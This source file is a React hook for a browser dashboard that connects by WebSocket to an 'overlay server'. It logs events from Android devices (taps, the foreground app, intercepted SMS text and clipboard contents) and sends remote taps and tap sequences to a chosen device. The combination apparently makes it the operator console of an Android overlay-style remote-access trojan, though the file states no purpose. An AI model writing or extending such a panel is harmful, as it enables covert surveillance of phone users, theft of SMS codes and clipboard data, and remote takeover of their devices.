"use client";

import { useState, useEffect, useCallback, useRef } from "react";

export type OverlayEvent = {
  type: "tap_event" | "window_event" | "sms" | "clipboard";
  deviceId?: string;
  x?: number;
  y?: number;
  package?: string;
  activity?: string;
  text?: string;
  ts?: number;
  _receivedAt?: string;
};

export type SequenceStep = {
  action: "tap";
  x: number;
  y: number;
  delay: number;
};

type ServerState = {
  wsConnected: boolean;
  devices: { 
    id: string; 
    manufacturer: string; 
    model: string; 
    version: string;
    screenWidth?: number;
    screenHeight?: number;
  }[];
  uptime: number;
  events: OverlayEvent[];
  stats: {
    taps: number;
    windows: number;
    sms: number;
    clipboard: number;
  };
  lastTap?: { x: number; y: number };
  activeWindow: {
    package: string;
    activity: string;
  };
};

export function useOverlayServer(wsUrl: string = "ws://localhost:3000") {
  const [state, setState] = useState<ServerState>({
    wsConnected: false,
    devices: [],
    uptime: 0,
    events: [],
    stats: { taps: 0, windows: 0, sms: 0, clipboard: 0 },
    activeWindow: { package: "—", activity: "—" },
  });

  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimer = useRef<NodeJS.Timeout | null>(null);
  const [errorToast, setErrorToast] = useState<string | null>(null);

  // Uptime counter
  useEffect(() => {
    if (!state.wsConnected) return;
    const timer = setInterval(() => {
      setState((prev) => ({ ...prev, uptime: prev.uptime + 1 }));
    }, 1000);
    return () => clearInterval(timer);
  }, [state.wsConnected]);

  const connect = useCallback(() => {
    if (wsRef.current?.readyState === WebSocket.OPEN) return;

    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;

    ws.onopen = () => {
      setState((prev) => ({ ...prev, wsConnected: true }));
      if (reconnectTimer.current) clearTimeout(reconnectTimer.current);
      ws.send(JSON.stringify({ type: "hello", client: "browser" }));
    };

    ws.onmessage = ({ data }) => {
      try {
        const msg = JSON.parse(data);
        handleMessage(msg);
      } catch (e) {
        console.error("Error parsing WS message:", e);
      }
    };

    ws.onclose = () => {
      setState((prev) => ({ ...prev, wsConnected: false }));
      reconnectTimer.current = setTimeout(connect, 3000);
    };

    ws.onerror = () => {
      // Handled by close
    };
  }, [wsUrl]);

  useEffect(() => {
    connect();
    return () => {
      if (wsRef.current) {
        wsRef.current.close();
      }
      if (reconnectTimer.current) {
        clearTimeout(reconnectTimer.current);
      }
    };
  }, [connect]);

  const handleMessage = (msg: any) => {
    switch (msg.type) {
      case "init":
        setState((prev) => {
          const log = (msg.log || []).reverse(); // Newest at the end
          const taps = log.filter((e: any) => e.type === "tap_event").length;
          const windows = log.filter((e: any) => e.type === "window_event").length;
          const sms = log.filter((e: any) => e.type === "sms").length;
          const clipboard = log.filter((e: any) => e.type === "clipboard").length;
          
          let lastTap = prev.lastTap;
          let activeWindow = prev.activeWindow;

          // Find last tap
          const lastTapEvent = log.find((e: any) => e.type === "tap_event");
          if (lastTapEvent) {
            lastTap = { x: lastTapEvent.x, y: lastTapEvent.y };
          }

          // Find last window
          const lastWindowEvent = log.find((e: any) => e.type === "window_event");
          if (lastWindowEvent) {
            activeWindow = {
              package: lastWindowEvent.package || "—",
              activity: lastWindowEvent.activity || "—",
            };
          }

          return {
            ...prev,
            devices: msg.devices || [],
            uptime: msg.uptime || 0,
            events: log,
            stats: { taps, windows, sms, clipboard },
            lastTap,
            activeWindow,
          };
        });
        break;

      case "device_list":
        setState((prev) => ({ ...prev, devices: msg.devices || [] }));
        break;

      case "event":
        ingestEvent(msg.data);
        break;

      case "error":
        showError(msg.message);
        break;
    }
  };

  const ingestEvent = (e: OverlayEvent) => {
    setState((prev) => {
      const isTap = e.type === "tap_event";
      const isWindow = e.type === "window_event";
      const isSms = e.type === "sms";
      const isClip = e.type === "clipboard";

      const newEvents = [...prev.events, e].slice(-500);
      
      return {
        ...prev,
        events: newEvents,
        stats: {
          taps: prev.stats.taps + (isTap ? 1 : 0),
          windows: prev.stats.windows + (isWindow ? 1 : 0),
          sms: prev.stats.sms + (isSms ? 1 : 0),
          clipboard: prev.stats.clipboard + (isClip ? 1 : 0),
        },
        lastTap: isTap ? { x: e.x!, y: e.y! } : prev.lastTap,
        activeWindow: isWindow
          ? { package: e.package || "—", activity: e.activity || "—" }
          : prev.activeWindow,
      };
    });
  };

  const showError = (message: string) => {
    setErrorToast(message);
    setTimeout(() => setErrorToast(null), 3000);
  };

  // Commands
  const sendCommand = (cmd: any) => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify({ type: "command", ...cmd }));
    } else {
      showError("Not connected to server");
    }
  };

  const sendTap = (targetDeviceId: string, x: number, y: number) => {
    sendCommand({ action: "tap", targetDeviceId, x, y });
  };

  const sendSequence = (targetDeviceId: string, steps: SequenceStep[]) => {
    sendCommand({ action: "sequence", targetDeviceId, steps });
  };

  const clearEvents = () => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify({ type: "clear_logs" }));
    }
    setState((prev) => ({
      ...prev,
      events: [],
      stats: { taps: 0, windows: 0, sms: 0, clipboard: 0 },
    }));
  };

  return {
    state,
    errorToast,
    sendTap,
    sendSequence,
    clearEvents,
  };
}
